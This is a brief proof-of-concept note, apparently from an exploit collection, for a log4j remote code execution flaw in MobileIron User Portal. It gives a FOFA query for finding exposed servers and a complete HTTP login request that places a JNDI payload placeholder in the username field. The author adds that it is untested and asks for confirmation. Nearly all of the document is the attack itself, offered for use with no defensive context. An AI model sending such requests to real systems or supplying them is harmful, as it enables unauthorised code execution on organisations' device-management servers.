# MobileIron User Portal log4j RCE

## fofa

```
app="MobileIron-User-Portal"
```

## Poc

```
POST /mifs/j_spring_security_check HTTP/1.1
Host: <Target>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://<Target>/mifs/user/login.jsp
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Origin: https://<Target>
Connection: close
Cookie: JSESSIONID=BE682E060EBF041A2B65EAC7E47F4F80
Upgrade-Insecure-Requests: 1

j_username=<JNDI Payload>&j_password=password&logincontext=employee
```

I have not tested it, If anyone confirm it, Please contribute the test screenshot.
